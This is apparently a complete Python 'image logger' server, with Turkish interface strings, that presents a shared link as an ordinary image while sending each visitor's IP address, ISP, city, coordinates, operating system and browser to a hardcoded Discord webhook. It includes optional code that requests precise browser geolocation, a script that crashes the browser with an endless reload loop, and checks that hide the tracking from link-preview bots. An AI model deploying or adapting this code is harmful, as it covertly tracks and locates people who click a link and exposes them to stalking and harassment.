# Discord Image Logger

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "oylesine bi image logger"
__version__ = "v2.0"
__author__ = "foaqen"

config = {
    "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png", 
    "imageArgument": True,

    "username": "Logger Agent", 
    "color": 0x00FFFF,

    "crashBrowser": False, 
    "accurateLocation": False,

    "message": {
        "doMessage": False, 
        "message": "Yeni bir kişi tıkladı.",
        "richMessage": True,
    },

    "vpnCheck": 1,
                # 0 = VPN kontrolünü kapat
                # 1 = VPN tespit edildiği zaman beni etiketleme
                # 2 = VPN tespit edildiği zaman bildirme

    "linkAlerts": False, 
    "buggedImage": True,

    "antiBot": 1,
    

    "redirect": {
        "redirect": False,
        "page": "https://example.org"
    },


}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Hata!",
            "color": config["color"],
            "description": f"IP adresi LOG'lanırken bir hata oluştu!\n\n**Hata:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Bağlantı Gönderildi",
                        "color": config["color"],
                        "description": f"IPLogger bağlantısı bir sohbete gönderildi!\nBirisi tıkladığında bilgilendirileceksiniz.\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - Birisi Tıkladı!",
                "color": config["color"],
                "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**

**Bitiş Noktası:** `{endpoint}`
            
**IP Adresi:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Ülke:** `{info['country'] if info['country'] else 'Unknown'}`
> **Bölge:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **Şehir:** `{info['city'] if info['city'] else 'Unknown'}`
> **Koordinat:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Saat Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobil:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**Bilgisayar Bilgileri:**
> **İşletim Sistemi:** `{os}`
> **Tarayıcı:** `{browser}`

**Aracı:**
{useragent}

""",
            }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

}

# By DeKrypt | https://github.com/dekrypted

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            # Fix for blacklisted IPs check
            forwarded_for = self.headers.get('x-forwarded-for', '')
            if forwarded_for and forwarded_for.startswith(blacklistedIPs):
                return
            
            # Fix bot check
            bot_result = botCheck(forwarded_for, self.headers.get('user-agent', ''))
            if bot_result:
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                else:
                    self.send_header('Location', url)
                self.end_headers()

                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])

                makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                else:
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", forwarded_for)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "0")))
                    message = message.replace("{long}", str(result.get("lon", "0")))
                    
                    timezone = result.get("timezone", "Unknown/Unknown")
                    if '/' in timezone:
                        message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
                    else:
                        message = message.replace("{timezone}", "Unknown")
                    
                    message = message.replace("{mobile}", str(result.get("mobile", False)))
                    message = message.replace("{vpn}", str(result.get("proxy", False)))
                    message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    
                    os_name, browser = httpagentparser.simple_detect(self.headers.get('user-agent', ''))
                    message = message.replace("{browser}", browser)
                    message = message.replace("{os}", os_name)

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i);while(1){location.reload()}}},100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

# This is needed to run the server
def run(server_class=BaseHTTPRequestHandler, handler_class=ImageLoggerAPI, port=8080):
    from http.server import HTTPServer
    server_address = ('', port)
    httpd = HTTPServer(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
